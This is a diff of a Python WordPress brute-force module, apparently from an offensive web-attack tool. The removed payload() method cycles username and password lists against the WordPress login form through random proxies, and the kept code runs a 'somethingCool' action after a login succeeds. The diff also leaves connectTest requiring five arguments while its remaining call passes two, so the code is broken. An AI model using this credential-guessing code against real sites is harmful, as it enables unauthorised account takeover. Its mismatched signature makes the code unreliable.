@@ -56,7 +56,7 @@ class wordpressBrute(webModule):
                 }
             self.connectTest(config, payload)
 
-    def connectTest(self, config, payload):
+    def connectTest(self, config, payload, proxy, submitLoc, submitType):
         with session() as c:
             proxy = random.choice(config["proxies"])
             requests.packages.urllib3.disable_warnings()
@@ -73,49 +73,3 @@ class wordpressBrute(webModule):
                     if not config["dry_run"]:
                         print("[!] Time to do something cool!")
                         self.somethingCool(config, c, cookies)
-    def payload(self, config):
-        if config["PASS_FILE"]:
-            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
-            for pass_line in pass_lines:
-                if config["UserFile"]:
-                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                    for line in lines:
-                        config["USERNAME"] = line.strip('\n')
-                        config["PASSWORD"] = pass_line.strip('\n')
-                        payload = {
-                            'log': config["USERNAME"],
-                            'pwd': config["PASSWORD"],
-                            'wp-submit': 'Log+In',
-                            'testcookie': '1'
-                            }
-                        self.connectTest(config, payload)
-                        time.sleep(config["timeout"])
-                else:
-                    config["PASSWORD"] = pass_line.strip('\n')
-                    payload = {
-                        'log': config["USERNAME"],
-                        'pwd': config["PASSWORD"],
-                        'wp-submit': 'Log+In',
-                        'testcookie': '1'
-                        }
-                    self.connectTest(config, payload)
-                    time.sleep(config["timeout"])
-        elif config["UserFile"]:
-            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-            for line in lines:
-                config["USERNAME"] = line.strip('\n')
-                payload = {
-                    'log': config["USERNAME"],
-                    'pwd': config["PASSWORD"],
-                    'wp-submit': 'Log+In',
-                    'testcookie': '1'
-                    }
-                self.connectTest(config, payload)
-        else:
-            payload = {
-                'log': config["USERNAME"],
-                'pwd': config["PASSWORD"],
-                'wp-submit': 'Log+In',
-                'testcookie': '1'
-                }
-            self.connectTest(config, payload)
